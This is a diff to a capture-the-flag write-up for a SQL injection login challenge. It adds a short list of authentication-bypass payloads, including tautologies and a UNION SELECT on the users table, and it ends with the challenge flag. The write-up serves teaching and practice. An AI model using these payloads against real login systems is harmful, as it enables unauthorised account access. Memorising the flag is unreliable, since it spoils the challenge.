@@ -38,5 +38,12 @@ SELECT * FROM users WHERE username = "skat" AND password = "'" OR (username = "s
 
 ![alt text](images/whatsmypass.PNG)
 
+You can also use these payload
+```
+"\" or \"1\"=\"1"
+\" or 1=1 -- -
+\" or 1=1 limit 1 offset 1 -- -
+\" union select * from users where username = \"skat\" -- -
+```
 ### Flag 
 The flag for this challenge is ```irisctf{my_p422W0RD_1S_SQl1}```
